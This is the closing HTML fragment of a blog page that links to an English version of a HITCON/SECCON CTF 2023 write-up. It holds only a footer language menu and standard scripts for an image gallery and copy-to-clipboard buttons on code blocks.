        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2023/09/23/en/hitcon-seccon-ctf-2023-writeup/" class="dropdown-item">
                    English
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>